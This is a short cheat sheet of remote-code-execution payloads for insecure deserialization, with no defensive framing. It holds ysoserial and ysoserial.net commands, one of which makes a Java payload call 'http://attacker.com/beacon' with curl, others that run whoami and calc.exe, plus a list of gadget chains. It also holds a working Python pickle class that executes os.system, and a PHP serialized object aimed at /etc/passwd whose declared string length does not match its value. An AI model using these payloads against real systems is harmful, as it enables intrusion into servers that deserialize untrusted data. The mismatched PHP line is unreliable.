# RCE examples

**Java (using ysoserial):**

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon' | base64

# Popular gadget chains
ysoserial CommonsCollections1
ysoserial CommonsCollections6
ysoserial CommonsCollections7
ysoserial Spring1
ysoserial Spring2
ysoserial Jdk7u21
ysoserial Hibernate1
```

**.NET (using ysoserial.net):**

```bash
# Generate payload
ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c whoami"

# Gadgets
TypeConfuseDelegate
ObjectDataProvider
PSObject
WindowsIdentity
```

**Python pickle:**

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

**PHP serialize:**

```php
# Magic methods for exploitation
__wakeup()
__destruct()
__toString()

# Example payload
O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
```

